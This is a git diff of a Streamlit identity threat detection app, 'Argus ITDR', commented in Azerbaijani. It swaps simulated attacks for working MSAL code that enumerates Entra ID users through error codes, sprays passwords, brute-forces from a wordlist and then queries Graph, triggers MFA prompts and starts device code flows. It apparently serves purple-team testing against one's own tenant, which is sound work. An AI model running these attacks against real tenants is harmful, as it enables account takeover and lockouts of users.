@@ -3,6 +3,7 @@ import pandas as pd
 import requests
 import time
 import io
+import warnings
 from datetime import datetime
 import plotly.express as px
 
@@ -12,6 +13,25 @@ from reportlab.lib import colors
 from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
 from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable
 
+from modules import config, storage
+
+# --- ATTACK ENGINE İNTEQRASİYASI ---
+attack_engine = None
+attack_engine_error = None
+try:
+    from modules.attack_engine import IdentityAttackEngine, USERS_FILE, PASSWORDS_FILE, generate_wordlists
+
+    generate_wordlists()
+    attack_engine = IdentityAttackEngine(USERS_FILE, PASSWORDS_FILE)
+except ImportError as e:
+    attack_engine_error = f"Modul import xətası: {e}"
+except RuntimeError as e:
+    # Ən çox rastlanan hal: .env-də ARGUS_TENANT_ID / CLIENT_ID / CLIENT_SECRET yoxdur
+    attack_engine_error = str(e)
+except Exception as e:
+    attack_engine_error = f"Gözlənilməz xəta: {e}"
+# --------------------------------------------------------
+
 # Streamlit Page Config
 st.set_page_config(
     page_title="Argus ITDR - Identity Threat Detection",
@@ -19,17 +39,24 @@ st.set_page_config(
     layout="wide"
 )
 
-WAZUH_ENDPOINT = "https://localhost:9200/argus-itdr-events/_doc"
-WAZUH_AUTH = ("admin", "SecretPassword")
+if not config.WAZUH_VERIFY_SSL:
+    # Self-signed sertifikatlı lokal Wazuh üçün SSL yoxlaması bağlıdırsa,
+    # ən azı console-u xəbərdarlıq spam-ından qoruyaq və niyyəti aydın edək.
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 def send_to_wazuh(payload):
+    if not config.WAZUH_PASSWORD:
+        return False, "WAZUH_PASSWORD .env-də təyin olunmayıb."
     try:
         response = requests.post(
-            WAZUH_ENDPOINT,
-            auth=WAZUH_AUTH,
+            config.WAZUH_ENDPOINT,
+            auth=(config.WAZUH_USER, config.WAZUH_PASSWORD),
             headers={"Content-Type": "application/json"},
             json=payload,
-            verify=False
+            verify=config.WAZUH_VERIFY_SSL,
+            timeout=5,
         )
         if response.status_code in [200, 201]:
             return True, response.json()
@@ -37,6 +64,27 @@ def send_to_wazuh(payload):
             return False, f"HTTP {response.status_code}: {response.text}"
     except Exception as e:
         return False, str(e)
+
+
+def detect_columns(df: pd.DataFrame) -> dict:
+    """
+    Fərqli mənbələrdən gələn log-larda sütun adlarını unifikasiya edir.
+    Bütün tab-larda təkrarlanan eyni if/else zəncirinin əvəzinə tək yerdən idarə olunur.
+    Tapılmayan sütun üçün None qaytarır (fərziyyə ilə mövcud olmayan sütuna
+    müraciət edib crash almaq əvəzinə).
+    """
+    def pick(*candidates):
+        for c in candidates:
+            if c in df.columns:
+                return c
+        return None
+
+    return {
+        "event": pick("EventID", "event_id"),
+        "user": pick("TargetUserName", "user", "TargetUser"),
+        "ip": pick("IpAddress", "source_ip", "IP"),
+    }
+
 
 # PDF Generation Function
 def generate_pdf_report(df, resolved_users, posture_score):
@@ -49,83 +97,67 @@ def generate_pdf_report(df, resolved_users, posture_score):
         topMargin=36,
         bottomMargin=36
     )
-    
+
     styles = getSampleStyleSheet()
-    
+
     title_style = ParagraphStyle(
-        'DocTitle',
-        parent=styles['Heading1'],
-        fontName='Helvetica-Bold',
-        fontSize=20,
-        textColor=colors.HexColor("#0E1117"),
-        spaceAfter=6
+        'DocTitle', parent=styles['Heading1'], fontName='Helvetica-Bold',
+        fontSize=20, textColor=colors.HexColor("#0E1117"), spaceAfter=6
     )
     subtitle_style = ParagraphStyle(
-        'DocSubTitle',
-        parent=styles['Normal'],
-        fontName='Helvetica',
-        fontSize=10,
-        textColor=colors.HexColor("#555555"),
-        spaceAfter=15
+        'DocSubTitle', parent=styles['Normal'], fontName='Helvetica',
+        fontSize=10, textColor=colors.HexColor("#555555"), spaceAfter=15
     )
     h2_style = ParagraphStyle(
-        'SectionHeader',
-        parent=styles['Heading2'],
-        fontName='Helvetica-Bold',
-        fontSize=14,
-        textColor=colors.HexColor("#1F77B4"),
-        spaceBefore=12,
-        spaceAfter=8
+        'SectionHeader', parent=styles['Heading2'], fontName='Helvetica-Bold',
+        fontSize=14, textColor=colors.HexColor("#1F77B4"), spaceBefore=12, spaceAfter=8
     )
     body_style = ParagraphStyle(
-        'BodyDark',
-        parent=styles['Normal'],
-        fontName='Helvetica',
-        fontSize=9,
-        textColor=colors.HexColor("#222222")
+        'BodyDark', parent=styles['Normal'], fontName='Helvetica',
+        fontSize=9, textColor=colors.HexColor("#222222")
     )
-    
+
     elements = []
 
-    # Document Header
     elements.append(Paragraph("🛡️ ARGUS ITDR - EXECUTIVE SECURITY AUDIT REPORT", title_style))
-    elements.append(Paragraph(f"<b>Generated:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')} | <b>Engine:</b> Argus Security AI & Analytics Platform", subtitle_style))
+    elements.append(Paragraph(
+        f"<b>Generated:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')} | "
+        f"<b>Engine:</b> Argus Security Analytics Platform", subtitle_style))
     elements.append(HRFlowable(width="100%", thickness=1.5, color=colors.HexColor("#1F77B4"), spaceAfter=15))
 
-    # Executive Summary Metrics Table
+    cols = detect_columns(df)
+    event_col = cols["event"]
+    user_col = cols["user"] or "TargetUserName"
+    ip_col = cols["ip"] or "IpAddress"
+
     total_events = len(df)
-    event_col = 'EventID' if 'EventID' in df.columns else ('event_id' if 'event_id' in df.columns else None)
     failed_attempts = len(df[df[event_col].astype(str).str.contains('4625')]) if event_col else total_events
     remediated_count = len(resolved_users)
-    
+
     summary_data = [
         [Paragraph("<b>Metric</b>", body_style), Paragraph("<b>Value</b>", body_style), Paragraph("<b>Status / Context</b>", body_style)],
-        [Paragraph("Security Posture Score", body_style), Paragraph(f"<b>{posture_score} / 100</b>", body_style), Paragraph("Evaluated via Real-time AI Engine", body_style)],
+        [Paragraph("Security Posture Score", body_style), Paragraph(f"<b>{posture_score} / 100</b>", body_style), Paragraph("Evaluated via Real-time Risk Engine", body_style)],
         [Paragraph("Total Ingested Events", body_style), Paragraph(str(total_events), body_style), Paragraph("Active Directory / Entra ID Telemetry", body_style)],
         [Paragraph("Identity Threats (Failed Logons)", body_style), Paragraph(str(failed_attempts), body_style), Paragraph("Event ID 4625 Anomalies Detected", body_style)],
-        [Paragraph("Threats Auto-Remediated", body_style), Paragraph(str(remediated_count), body_style), Paragraph("Conditional Access & Token Revocation", body_style)]
+        [Paragraph("Threats Remediated", body_style), Paragraph(str(remediated_count), body_style), Paragraph("Conditional Access & Token Revocation", body_style)]
     ]
 
     summary_table = Table(summary_data, colWidths=[180, 100, 260])
     summary_table.setStyle(TableStyle([
-        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#EAEAEA")),
-        ('TEXTCOLOR', (0,0), (-1,0), colors.black),
-        ('ALIGN', (0,0), (-1,-1), 'LEFT'),
-        ('BOTTOMPADDING', (0,0), (-1,-1), 6),
-        ('TOPPADDING', (0,0), (-1,-1), 6),
-        ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#DDDDDD")),
+        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#EAEAEA")),
+        ('TEXTCOLOR', (0, 0), (-1, 0), colors.black),
+        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
+        ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
+        ('TOPPADDING', (0, 0), (-1, -1), 6),
+        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#DDDDDD")),
     ]))
-    
+
     elements.append(Paragraph("1. Executive Summary", h2_style))
     elements.append(summary_table)
     elements.append(Spacer(1, 15))
 
-    # Threat Findings & AI Remediation Summary
     elements.append(Paragraph("2. Threat Analysis & Remediation Log", h2_style))
-    
-    user_col = 'TargetUserName' if 'TargetUserName' in df.columns else ('user' if 'user' in df.columns else 'TargetUser')
-    ip_col = 'IpAddress' if 'IpAddress' in df.columns else ('source_ip' if 'source_ip' in df.columns else 'IP')
-    
+
     table_data = [[
         Paragraph("<b>Target User</b>", body_style),
         Paragraph("<b>Attacker IP</b>", body_style),
@@ -140,10 +172,10 @@ def generate_pdf_report(df, resolved_users, posture_score):
             ip = str(row.get(ip_col, "127.0.0.1"))
             err = str(row.get("ErrorCode", "AADSTS50126"))
             method = str(row.get("AuthMethod", "OAuth2/NTLM"))
-            
+
             is_blocked = user in resolved_users
             status_text = "<b><font color='#28A745'>REMEDIATED (Blocked)</font></b>" if is_blocked else "<b><font color='#DC3545'>ACTIVE THREAT</font></b>"
-            
+
             table_data.append([
                 Paragraph(user, body_style),
                 Paragraph(ip, body_style),
@@ -151,22 +183,21 @@ def generate_pdf_report(df, resolved_users, posture_score):
                 Paragraph(method, body_style),
                 Paragraph(status_text, body_style)
             ])
-    
+
     threat_table = Table(table_data, colWidths=[110, 100, 90, 100, 140])
     threat_table.setStyle(TableStyle([
-        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#1F77B4")),
-        ('TEXTCOLOR', (0,0), (-1,0), colors.white),
-        ('ALIGN', (0,0), (-1,-1), 'LEFT'),
-        ('BOTTOMPADDING', (0,0), (-1,-1), 5),
-        ('TOPPADDING', (0,0), (-1,-1), 5),
-        ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CCCCCC")),
+        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#1F77B4")),
+        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
+        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
+        ('BOTTOMPADDING', (0, 0), (-1, -1), 5),
+        ('TOPPADDING', (0, 0), (-1, -1), 5),
+        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#CCCCCC")),
     ]))
-    
+
     elements.append(threat_table)
     elements.append(Spacer(1, 15))
 
-    # Hardening Recommendations
-    elements.append(Paragraph("3. AI Hardening & Strategic Recommendations", h2_style))
+    elements.append(Paragraph("3. Hardening & Strategic Recommendations", h2_style))
     recs = [
         "<b>Enforce Phishing-Resistant MFA:</b> Upgrade identity scopes to require FIDO2 Security Keys or Certificate-Based Authentication.",
         "<b>Deploy Entra ID Protection Policies:</b> Enable automated Smart Lockout thresholds to block password spray IP pools dynamically.",
@@ -177,28 +208,33 @@ def generate_pdf_report(df, resolved_users, posture_score):
         elements.append(Paragraph(f"• {r}", body_style))
         elements.append(Spacer(1, 4))
 
-    # Build Document
     doc.build(elements)
     buffer.seek(0)
     return buffer
 
-# Session state initialization
+
+# ----------------------------------------------------------------------
+# Session state initialization — İNDİ SQLite-dan yüklənir (persistence)
+# ----------------------------------------------------------------------
 if 'df' not in st.session_state:
-    st.session_state['df'] = pd.DataFrame(columns=['EventID', 'TargetUserName', 'IpAddress', 'Status', 'AuthMethod', 'ErrorCode'])
+    persisted_df = storage.load_events()
+    if persisted_df.empty:
+        persisted_df = pd.DataFrame(columns=storage.EVENT_COLUMNS)
+    st.session_state['df'] = persisted_df
 
 if 'resolved_users' not in st.session_state:
-    st.session_state['resolved_users'] = set()
+    st.session_state['resolved_users'] = storage.load_resolved_users()
 
 st.title("🛡️ Argus ITDR - Identity Threat Detection & Response")
 st.caption("Real-time Identity Log Analysis, Dynamic Risk Scoring, Analytics & SIEM Integration")
 
 tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs([
-    "📥 Live Log Ingestion", 
-    "🤖 AI Threat Analysis & Auto-Fix", 
+    "📥 Live Log Ingestion",
+    "🤖 AI Threat Analysis & Auto-Fix",
     "⚔️ Red Team Attack Controller",
     "🛡️ Blue Team & ITDR Dashboard",
     "📊 Interactive Analytics",
-    "🎯 Threat Detection Engine", 
+    "🎯 Threat Detection Engine",
     "⚙️ SIEM Integration Test",
     "📄 Security Audit Report"
 ])
@@ -207,10 +243,11 @@ tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs([
 with tab1:
     st.header("Active Directory & Identity Logs")
     uploaded_file = st.file_uploader("Upload CSV Log File", type=["csv"])
-    
+
     if uploaded_file is not None:
         df = pd.read_csv(uploaded_file)
         st.session_state['df'] = df
+        storage.append_events(df)
         st.subheader("Raw Identity Events")
         st.dataframe(df, use_container_width=True)
     else:
@@ -223,13 +260,15 @@ with tab1:
 # TAB 2: AI Threat Analysis & Auto-Fix
 with tab2:
     st.header("🤖 AI Threat Analysis & Remediation")
-    
+
+    if not config.ENABLE_REAL_REMEDIATION:
+        st.caption("ℹ️ Hazırda **SIMULATION MODE**-dadır (`.env`-də `ENABLE_REAL_REMEDIATION=false`). "
+                   "Remediation düymələri real Entra ID dəyişikliyi ETMİR, yalnız Wazuh-a log göndərir.")
+
     if 'df' in st.session_state and not st.session_state['df'].empty:
         df = st.session_state['df']
-
-        event_col = 'EventID' if 'EventID' in df.columns else ('event_id' if 'event_id' in df.columns else None)
-        user_col = 'TargetUserName' if 'TargetUserName' in df.columns else ('user' if 'user' in df.columns else ('TargetUser' if 'TargetUser' in df.columns else None))
-        ip_col = 'IpAddress' if 'IpAddress' in df.columns else ('source_ip' if 'source_ip' in df.columns else ('IP' if 'IP' in df.columns else None))
+        cols = detect_columns(df)
+        event_col, user_col, ip_col = cols["event"], cols["user"], cols["ip"]
 
         if event_col:
             threat_df = df[df[event_col].astype(str).str.contains('4625')]
@@ -252,8 +291,8 @@ with tab2:
         col1, col2, col3 = st.columns(3)
         with col1:
             st.metric(
-                label="Real-time Security Posture Score", 
-                value=f"{calculated_score} / 100", 
+                label="Real-time Security Posture Score",
+                value=f"{calculated_score} / 100",
                 delta=risk_label,
                 delta_color="normal" if calculated_score >= 80 else "inverse"
             )
@@ -263,7 +302,7 @@ with tab2:
             st.metric(label="Threats Remediated", value=f"{resolved_count} Users Blocked")
 
         st.markdown("---")
-        st.subheader("💡 Dynamic AI Remediation Guidance & Action")
+        st.subheader("💡 Dynamic Remediation Guidance & Action")
 
         if len(threat_df) == 0:
             st.success("✅ No active identity threats detected in telemetry.")
@@ -273,196 +312,264 @@ with tab2:
                 ip = str(row.get(ip_col, "185.220.101.5")) if ip_col else "185.220.101.5"
                 auth_method = row.get("AuthMethod", "OAuth2/NTLM")
                 err_code = row.get("ErrorCode", "AADSTS50126")
-                
+
                 is_resolved = user in st.session_state['resolved_users']
-                
+
                 with st.expander(f"⚠️ **Target User:** {user} | **Event ID:** 4625 | **Error:** {err_code} | **IP:** {ip}", expanded=not is_resolved):
                     if is_resolved:
-                        st.success(f"✅ Session for `{user}` revoked & account disabled in Entra ID.")
+                        st.success(f"✅ Remediation already applied for `{user}`.")
                     else:
                         st.error(f"🚨 **Risk Assessment:** Active Threat Detected on `{user}` via `{auth_method}`!")
-                        st.info(f"🤖 **AI Auto-Fix Action:** Revoke all Active Refresh Tokens and trigger Conditional Access Lockout for `{user}`.")
-                        
-                        if st.button(f"🚫 Execute AI Remediation ({user})", key=f"btn_ai_block_{idx}_{user}"):
+                        st.info(f"🤖 **Suggested Action:** Revoke all Active Refresh Tokens and trigger Conditional Access Lockout for `{user}`.")
+
+                        if st.button(f"🚫 Execute Remediation ({user})", key=f"btn_ai_block_{idx}_{user}"):
+                            use_real = config.ENABLE_REAL_REMEDIATION and attack_engine is not None
+
+                            if use_real:
+                                ok1, msg1 = attack_engine.revoke_sign_in_sessions(user)
+                                ok2, msg2 = attack_engine.disable_account(user)
+                                real_ok = ok1 and ok2
+                                detail = f"{msg1} | {msg2}"
+                                mode = "REAL"
+                            else:
+                                real_ok = True
+                                detail = "Simulation mode: no real Entra ID change was made."
+                                mode = "SIMULATION"
+
                             alert_payload = {
                                 "timestamp": datetime.utcnow().isoformat() + "Z",
-                                "event_type": "AI_AUTO_FIX_EXECUTION",
+                                "event_type": "REMEDIATION_EXECUTION",
                                 "target_user": user,
                                 "source_ip": ip,
-                                "action_taken": "ACCOUNT_DISABLED_ENTRA_ID",
-                                "triggered_by": "Argus-AI-Engine",
-                                "status": "SUCCESS"
+                                "action_taken": "ACCOUNT_DISABLED_ENTRA_ID" if mode == "REAL" else "SIMULATED_LOCKOUT",
+                                "triggered_by": "Argus-Engine",
+                                "status": "SUCCESS" if real_ok else "FAILED",
+                                "detail": detail,
+                                "mode": mode,
                             }
                             send_to_wazuh(alert_payload)
-                            st.session_state['resolved_users'].add(user)
-                            st.success(f"✅ Remediated! Account `{user}` locked out and logged to Wazuh SIEM.")
+
+                            if real_ok:
+                                st.session_state['resolved_users'].add(user)
+                                storage.add_resolved_user(user)
+                                st.success(f"✅ [{mode}] {detail}")
+                            else:
+                                st.error(f"❌ [{mode}] {detail}")
                             st.rerun()
     else:
         st.warning("⚠️ No logs ingested or generated yet. Upload CSV or run Red Team Attack Simulation.")
 
-# TAB 3: Red Team Attack Controller
+# TAB 3: Red Team Attack Controller & Simulation Engine
 with tab3:
     st.header("⚔️ Red Team Attack Controller & Simulation Engine")
-    st.caption("Simulate real-world identity attacks against Entra ID / Active Directory and observe live MSAL responses.")
-    
+    st.caption("Execute MSAL authentication attacks against your own Microsoft Entra ID test tenant.")
+
+    if attack_engine is None:
+        st.error(
+            "❌ Attack Engine yüklənmədi: "
+            f"{attack_engine_error or 'naməlum xəta'}\n\n"
+            "`.env` faylında `ARGUS_TENANT_ID`, `ARGUS_CLIENT_ID`, `ARGUS_CLIENT_SECRET` "
+            "dəyərlərini doldurduğunuzdan əmin olun."
+        )
+
     col_left, col_right = st.columns([1, 1])
-    
+
     with col_left:
         st.subheader("⚙️ Custom Attack Parameters")
-        target_users = st.text_area("Target Users (One per line)", value="tyler.durden\nmarla.singer\ntrevor.reznik\nneo")
-        passwords = st.text_input("Password / Password List", value="Spring2026! / Wordlist_v1.txt")
-        attack_delay = st.slider("Attack Delay per Attempt (Seconds)", min_value=0.1, max_value=2.0, value=0.2, step=0.1)
-        source_attacker_ip = st.text_input("Attacker Source IP", value="185.220.101.5 (Tor Exit Node)")
-        
+        default_domain = config.DOMAIN or "example.onmicrosoft.com"
+        target_user_input = st.text_input("Target User (for Brute Force / MFA)", value=f"user2@{default_domain}")
+        spray_password_input = st.text_input("Spray Password", value="")
+        max_targets_count = st.slider("Max Target Limit", min_value=1, max_value=50, value=18)
+
         st.markdown("---")
-        st.subheader("🎯 Attack Controller Triggers")
-        
-        btn_spray = st.button("🚀 Launch Password Spray Attack")
-        btn_brute = st.button("🔨 Launch Brute Force Attack")
-        btn_enum = st.button("🔍 Launch User Enumeration")
-        btn_device = st.button("🔑 Launch Device Code Flow Phishing")
+        st.subheader("🎯 Attack Triggers")
+
+        btn_enum = st.button("🔍 Launch User Enumeration", disabled=attack_engine is None)
+        btn_spray = st.button("🚀 Launch Password Spray Attack", disabled=attack_engine is None)
+        btn_brute = st.button("🔨 Launch Brute Force Attack", disabled=attack_engine is None)
+        btn_mfa = st.button("📲 Launch MFA Fatigue Simulation", disabled=attack_engine is None)
+        btn_device = st.button("🔑 Launch Device Code Flow Phishing", disabled=attack_engine is None)
 
     with col_right:
         st.subheader("🖥️ Live Attack Terminal Console (`attack_engine.py`)")
         terminal_placeholder = st.empty()
-        
+
         terminal_placeholder.code(
-            "[+] Attack Engine Standby...\n"
-            "[+] MSAL Authentication Provider: Ready\n"
-            "[+] Target Scope: https://login.microsoftonline.com/common\n"
-            "[*] Awaiting operator trigger command...",
+            "[+] Attack Engine Initialized...\n"
+            f"[+] Target Domain: {config.DOMAIN or '(not configured)'}\n"
+            "[*] Ready to execute authentication attempts against Entra ID.",
             language="bash"
         )
 
-    if btn_spray or btn_brute or btn_enum or btn_device:
-        user_list = [u.strip() for u in target_users.split("\n") if u.strip()]
+    if attack_engine is not None and (btn_enum or btn_spray or btn_brute or btn_mfa or btn_device):
         console_logs = []
         new_events = []
-        
-        if btn_spray:
-            attack_type = "PASSWORD_SPRAY"
-            console_logs.append(f"[*] Starting {attack_type} against {len(user_list)} accounts...")
-            
-            for u in user_list:
-                console_logs.append(f"[>] [MSAL AUTH REQUEST] User: {u} | Grant: password")
-                time.sleep(attack_delay)
-                console_logs.append(f"[!] [MSAL RESPONSE 400] AADSTS50126: Invalid password for {u}")
-                
-                new_events.append({"EventID": 4625, "TargetUserName": u, "IpAddress": "185.220.101.5", "Status": "FAILED", "AuthMethod": "PasswordSpray", "ErrorCode": "AADSTS50126"})
-                send_to_wazuh({
-                    "timestamp": datetime.utcnow().isoformat() + "Z",
-                    "event_id": 4625, "user": u, "source_ip": "185.220.101.5",
-                    "rule_title": "Entra ID Password Spray Attempt", "severity": "HIGH", "source": "Argus-RedTeam-Engine"
-                })
-                terminal_placeholder.code("\n".join(console_logs), language="bash")
 
-        elif btn_brute:
-            attack_type = "BRUTE_FORCE"
-            target_user = user_list[0] if user_list else "tyler.durden"
-            console_logs.append(f"[*] Starting {attack_type} targeting user: {target_user}")
-            
-            for i in range(1, 6):
-                console_logs.append(f"[>] Attempt {i}/5 | Password: Pass#{i}23! | User: {target_user}")
-                time.sleep(attack_delay)
-                
-                err_code = "AADSTS50053" if i >= 4 else "AADSTS50126"
-                console_logs.append(f"[!] [401 Unauthorized] {err_code}: Bad credentials for {target_user}")
-                
-                new_events.append({"EventID": 4625, "TargetUserName": target_user, "IpAddress": "185.220.101.5", "Status": "FAILED", "AuthMethod": "BruteForce", "ErrorCode": err_code})
-                send_to_wazuh({
-                    "timestamp": datetime.utcnow().isoformat() + "Z",
-                    "event_id": 4625, "user": target_user, "source_ip": "185.220.101.5",
-                    "rule_title": "Brute Force Authentication Attempt",
-                    "severity": "CRITICAL" if err_code == "AADSTS50053" else "HIGH",
-                    "source": "Argus-RedTeam-Engine"
-                })
-                terminal_placeholder.code("\n".join(console_logs), language="bash")
-
-        elif btn_enum:
-            attack_type = "USER_ENUMERATION"
-            console_logs.append(f"[*] Starting {attack_type} probing tenant endpoints...")
-            
-            for u in user_list:
-                console_logs.append(f"[>] Probing account existence: {u}@domain.com")
-                time.sleep(attack_delay)
-                err_code = "AADSTS50034"
-                console_logs.append(f"[!] [404 Not Found] {err_code}: User account {u} does not exist in tenant")
-                
-                new_events.append({"EventID": 4625, "TargetUserName": u, "IpAddress": "185.220.101.5", "Status": "FAILED", "AuthMethod": "UserEnumAPI", "ErrorCode": err_code})
-                send_to_wazuh({
-                    "timestamp": datetime.utcnow().isoformat() + "Z",
-                    "event_id": 4625, "user": u, "source_ip": "185.220.101.5",
-                    "rule_title": "Entra ID User Enumeration Attempt", "severity": "MEDIUM", "source": "Argus-RedTeam-Engine"
-                })
-                terminal_placeholder.code("\n".join(console_logs), language="bash")
-
-        elif btn_device:
-            attack_type = "DEVICE_CODE_PHISHING"
-            console_logs.append("[*] Initializing OAuth2 Device Code Flow Phishing Simulation...")
-            time.sleep(attack_delay)
-            console_logs.append("[+] User Code Generated: [ D3V-C0D3 ]")
-            console_logs.append("⚠️ [ALERT] Device Code Token Intercepted for user: trevor.reznik")
-            
-            new_events.append({"EventID": 4625, "TargetUserName": "trevor.reznik", "IpAddress": "185.220.101.5", "Status": "FAILED", "AuthMethod": "DeviceCodeFlow", "ErrorCode": "AADSTS70016"})
-            send_to_wazuh({
-                "timestamp": datetime.utcnow().isoformat() + "Z",
-                "event_id": 4625, "user": "trevor.reznik", "source_ip": "185.220.101.5",
-                "rule_title": "OAuth2 Device Code Phishing Intercept", "severity": "CRITICAL", "source": "Argus-RedTeam-Engine"
-            })
+        if btn_enum:
+            console_logs.append(f"[*] Executing User Enumeration (Max: {max_targets_count})...\n")
             terminal_placeholder.code("\n".join(console_logs), language="bash")
 
-        new_df = pd.DataFrame(new_events)
-        if st.session_state['df'].empty:
-            st.session_state['df'] = new_df
-        else:
+            for user in attack_engine.users[:max_targets_count]:
+                result = attack_engine.public_app.acquire_token_by_username_password(
+                    username=user, password="DummyPassword123!", scopes=["https://graph.microsoft.com/.default"]
+                )
+                err_desc = result.get("error_description", "")
+                if any(code in err_desc for code in ["AADSTS50126", "AADSTS50055", "AADSTS50053", "AADSTS7000218"]):
+                    status_text = f"[+] MÖVCUDDUR (Valid User): {user}"
+                elif "AADSTS50034" in err_desc:
+                    status_text = f"[-] MÖVCUD DEYİL (Invalid User): {user}"
+                else:
+                    status_text = f"[?] CAVAB ({user}): {err_desc[:40]}..."
+
+                console_logs.append(status_text)
+                terminal_placeholder.code("\n".join(console_logs), language="bash")
+
+        elif btn_spray:
+            if not spray_password_input:
+                st.warning("Spray Password boşdur — sınaq üçün bir şifrə daxil edin.")
+            else:
+                console_logs.append(f"[*] Executing Password Spray...\n")
+                terminal_placeholder.code("\n".join(console_logs), language="bash")
+
+                for user in attack_engine.users[:max_targets_count]:
+                    result = attack_engine.public_app.acquire_token_by_username_password(
+                        username=user, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
+                    )
+                    if "access_token" in result:
+                        res_line = f"[+] UĞURLU: {user}"
+                        evt_id = 4624
+                        status = "SUCCESS"
+                    else:
+                        err = result.get("error_description", "").splitlines()[0]
+                        res_line = f"[-] UĞURSUZ: {user} -> ({err[:40]}...)"
+                        evt_id = 4625
+                        status = "FAILED"
+
+                    console_logs.append(res_line)
+                    terminal_placeholder.code("\n".join(console_logs), language="bash")
+
+                    new_events.append({
+                        "EventID": evt_id,
+                        "TargetUserName": user,
+                        "IpAddress": "185.220.101.5",
+                        "Status": status,
+                        "AuthMethod": "PasswordSpray",
+                        "ErrorCode": result.get("error", "None")
+                    })
+
+        elif btn_brute:
+            console_logs.append(f"[*] Executing Brute Force against {target_user_input}...\n")
+            terminal_placeholder.code("\n".join(console_logs), language="bash")
+
+            test_passwords = attack_engine.passwords[:5]
+            for pwd in test_passwords:
+                result = attack_engine.public_app.acquire_token_by_username_password(
+                    username=target_user_input, password=pwd, scopes=["https://graph.microsoft.com/.default"]
+                )
+                if "access_token" in result:
+                    console_logs.append(f"[+] UĞURLU: Doğru şifrə tapıldı -> '{pwd}'")
+                    terminal_placeholder.code("\n".join(console_logs), language="bash")
+
+                    console_logs.append("\n[*] Running Post-Exploitation Reconnaissance...")
+                    headers = {"Authorization": f"Bearer {result['access_token']}"}
+                    resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
+                    if resp.status_code == 200:
+                        u_data = resp.json()
+                        console_logs.append(f"[+] User Info Retrieved: {u_data.get('displayName')} ({u_data.get('userPrincipalName')})")
+                    break
+                else:
+                    err = result.get("error_description", "").splitlines()[0]
+                    console_logs.append(f"[-] UĞURSUZ: {pwd} -> ({err[:35]}...)")
+                    terminal_placeholder.code("\n".join(console_logs), language="bash")
+                time.sleep(0.5)
+
+        elif btn_mfa:
+            console_logs.append(f"[*] Executing MFA Fatigue Simulation against {target_user_input}...\n")
+            terminal_placeholder.code("\n".join(console_logs), language="bash")
+
+            if not spray_password_input:
+                st.warning("MFA simulyasiyası üçün Spray Password sahəsinə hədəfin bilinən şifrəsini daxil edin.")
+            else:
+                for i in range(1, 3):
+                    console_logs.append(f"[*] Attempt #{i}...")
+                    result = attack_engine.public_app.acquire_token_by_username_password(
+                        username=target_user_input, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
+                    )
+                    err_desc = result.get("error_description", "")
+                    first_line = err_desc.splitlines()[0] if err_desc else "Success/Token"
+                    console_logs.append(f" └─ Response: {first_line[:55]}...")
+                    terminal_placeholder.code("\n".join(console_logs), language="bash")
+                    time.sleep(1)
+
+        elif btn_device:
+            console_logs.append("[*] Initiating OAuth Device Code Flow...\n")
+            flow = attack_engine.public_app.initiate_device_flow(scopes=["https://graph.microsoft.com/.default"])
+            if "user_code" in flow:
+                console_logs.append(f"[+] Verification URL: {flow['verification_uri']}")
+                console_logs.append(f"[+] User Code: {flow['user_code']}")
+            else:
+                console_logs.append("[-] Device Code Flow initiation failed.")
+            terminal_placeholder.code("\n".join(console_logs), language="bash")
+
+        if new_events:
+            new_df = pd.DataFrame(new_events)
             st.session_state['df'] = pd.concat([st.session_state['df'], new_df], ignore_index=True)
-            
-        st.success(f"⚡ {attack_type} completed! Refreshing state...")
-        time.sleep(0.5)
-        st.rerun()
+            storage.append_events(new_df)
+
+            for ev in new_events:
+                send_to_wazuh({
+                    "timestamp": datetime.utcnow().isoformat() + "Z",
+                    "event_id": ev["EventID"],
+                    "user": ev["TargetUserName"],
+                    "source_ip": ev["IpAddress"],
+                    "rule_title": "RedTeam MSAL Attack Executed",
+                    "severity": "HIGH",
+                    "source": "Argus-RedTeam-Engine"
+                })
+
+        st.success("Attack execution completed.")
 
 # TAB 4: Blue Team & ITDR Dashboard
 with tab4:
     st.header("🛡️ Blue Team & ITDR Monitoring Dashboard")
     st.caption("Real-time Event Feed, Entra ID Sign-in Logs & Microsoft Smart Lockout Watchlist")
-    
+
     if 'df' in st.session_state and not st.session_state['df'].empty:
         df = st.session_state['df']
-        
-        user_col = 'TargetUserName' if 'TargetUserName' in df.columns else ('user' if 'user' in df.columns else 'TargetUser')
-        event_col = 'EventID' if 'EventID' in df.columns else ('event_id' if 'event_id' in df.columns else None)
-        ip_col = 'IpAddress' if 'IpAddress' in df.columns else ('source_ip' if 'source_ip' in df.columns else 'IP')
+        cols = detect_columns(df)
+        event_col, user_col, ip_col = cols["event"], cols["user"], cols["ip"]
 
         st.subheader("🔒 Active Lockout Watchlist (Smart Lockout Triggered)")
-        
-        if event_col and user_col in df.columns:
+
+        if event_col and user_col:
             lockout_users = df[df[event_col] == 4625][user_col].value_counts()
             locked_accounts = lockout_users[lockout_users >= 3].index.tolist()
         else:
+            lockout_users = pd.Series(dtype=int)
             locked_accounts = []
-        
+
         if len(locked_accounts) > 0:
-            cols = st.columns(min(len(locked_accounts), 4))
+            cols_ui = st.columns(min(len(locked_accounts), 4))
             for idx, account in enumerate(locked_accounts):
-                with cols[idx % 4]:
+                with cols_ui[idx % 4]:
